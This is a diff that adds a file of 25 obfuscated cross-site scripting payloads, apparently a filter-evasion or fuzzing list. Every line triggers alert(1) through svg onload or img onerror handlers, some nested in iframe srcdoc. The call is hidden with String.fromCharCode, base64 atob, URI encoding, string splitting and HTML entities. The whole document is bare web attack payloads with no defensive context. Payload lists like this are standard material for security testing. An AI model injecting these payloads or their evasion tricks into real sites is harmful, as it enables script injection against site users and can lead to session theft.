@@ -1,0 +1,25 @@
+<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)>
+<iframe srcdoc="<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41),0)>"></iframe>
+<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,46,97,108,101,114,116,40,49,41))>
+<iframe srcdoc="<svg onload=window[&apos;al&apos;+&apos;ert&apos;](1)>"></iframe>
+<iframe srcdoc='<img src=x onerror=eval(atob(&quot;YWxlcnQoMSk=&quot;))>'></iframe>
+<svg onload=eval(decodeURIComponent(&#39;%61%6C%65%72%74%28%31%29&#39;))>
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent('%77%69%6e%64%6f%77%5b%27%61%6c%65%72%74%27%5d%28%31%29'))>"></iframe>
+<svg onload=eval(atob('d2luZG93LmFsZXJ0KDEp'))>
+<iframe srcdoc="<svg onload=eval(atob('d2luZG93WydhbGVydCddKDEp'))>"></iframe>
+<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,91,39,97,108,101,114,116,39,93,40,49,41))>
+<iframe srcdoc='<svg onload=eval(atob(&#34;d2luZG93WydhbGVydCddKDEp&#34;))>'></iframe>
+<svg onload=eval(atob('d2luZG93WydhbGVydCddKDEp'))>
+<iframe srcdoc="<img src=x onerror=eval(decodeURIComponent(&#34;%77%69%6e%64%6f%77%5b%27%61%6c%65%72%74%27%5d%28%31%29&#34;))>"></iframe>
+<iframe srcdoc='<img src=x onerror=eval(atob(&#39;d2luZG93WydhbGVydCddKDEp&#39;))>'></iframe>
+<svg onload=eval(atob(&#34;d2luZG93LmFsZXJ0KDEp&#34;))>
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(119,105,110,100,111,119,46,97,108,101,114,116,40,49,41))>"></iframe>
+<svg onload=eval(atob(&#39;d2luZG93LmFsZXJ0KDEp&#39;))>
+<iframe srcdoc="<img src=x onerror=eval(atob(&quot;d2luZG93WydhbGVydCddKDEp&quot;))>"></iframe>
+<svg onload=eval(atob(&quot;d2luZG93LmFsZXJ0KDEp&quot;))>
+<iframe srcdoc='<svg onload=eval(atob(&quot;d2luZG93WydhbGVydCddKDEp&quot;))>'></iframe>
+<svg onload=eval(atob(&quot;d2luZG93WydhbGVydCddKDEp&quot;))>
+<iframe srcdoc="<img src=x onerror=eval(atob(&#34;d2luZG93LmFsZXJ0KDEp&#34;))>"></iframe>
+<svg onload=eval(atob(&#34;d2luZG93WydhbGVydCddKDEp&#34;))>
+<iframe srcdoc="<svg onload=eval(atob(&#39;d2luZG93LmFsZXJ0KDEp&#39;))>"></iframe>
+<svg onload=eval(atob(&#39;d2luZG93LmFsZXJ0KDEp&#39;))>
